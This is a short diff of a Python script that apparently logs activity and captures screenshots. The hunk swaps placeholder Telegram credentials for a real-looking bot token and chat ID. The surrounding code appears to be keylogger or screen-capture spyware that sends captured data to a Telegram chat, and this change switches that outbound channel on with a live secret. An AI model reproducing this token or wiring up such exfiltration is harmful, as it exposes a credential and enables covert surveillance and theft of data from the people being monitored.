@@ -18,8 +18,8 @@ except ImportError:
     ImageGrab = None
 
 # === CONFIGURATION ===
-BOT_TOKEN = "YOUR_TELEGRAM_BOT_TOKEN"
-CHAT_ID = "YOUR_CHAT_ID"
+BOT_TOKEN = "7642479754:AAFqZszYthVpuIyZLjX0-pcg4TqH8NHY70I"
+CHAT_ID = "7819572254"
 API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 log = []
 logging_enabled = True
